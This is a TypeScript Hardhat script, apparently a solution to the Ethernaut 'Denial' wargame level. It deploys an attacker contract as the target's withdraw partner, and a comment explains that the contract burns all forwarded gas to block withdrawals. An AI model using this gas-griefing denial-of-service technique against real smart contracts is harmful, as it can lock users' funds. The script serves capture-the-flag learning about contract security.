import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/20.Denial/Denial.sol/Denial.json";
import { Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { displayResult } from "../../utils/displayResult";
import { deployContract } from "../../utils/deployContract";

const targetAddress = "0x3eB3e2A19A9FE924a00c8908AE182C9948347dB6";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);
  const denialAttacker = await deployContract("DenialAttacker", attacker);

  const tx = await target.setWithdrawPartner(denialAttacker.address);
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/*  Explanation of the code:
    The call function is solidity will send all gas remaining to the called contract.
    To alt completely the execution we can spend all the remaining gas, with a loop for example 
    or with assert(false).
*/
